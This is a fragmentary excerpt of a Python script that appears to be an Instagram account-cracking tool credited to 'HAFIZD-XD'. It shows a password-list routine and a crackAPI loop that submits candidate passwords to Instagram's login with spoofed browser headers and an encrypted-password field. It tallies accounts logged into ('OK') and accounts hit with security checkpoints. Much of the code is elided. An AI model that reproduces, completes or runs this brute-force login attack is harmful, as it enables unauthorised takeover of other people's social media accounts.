...
def banner():
    ...
    au='__________ _____ / _/ ___/ | / < / _/ // (_ /| |/ // / /___/\___/ |___//_/ '

    pengembang1=nel(au,style="red")

    cetak(nel(pengembang1, title='AUTHOR : HAFIZDXD '))
...
[{H}•{C}]Following      : {following}'''
    ...
    def passwordAPI(self,xnx):
        ...
        pilpass1=mark(pilpass,style="yellow")
    ...
    def crackAPI(self,user,pas):
        ...
        sys.stdout.write(f"\r{CY} [HAFIZD-XD] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        ...
        try:
            ...
            for pw in pas:
                ...
                headers = {
					...
					'x-instagram-ajax': '1005633336-hot',					'content-type': 'application/x-www-form-urlencoded',
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                ...
                if "userId" in str(x_jason):
                    ...
                    cetak(nel(oi, title=' AKUN | CHECKPOINT'))
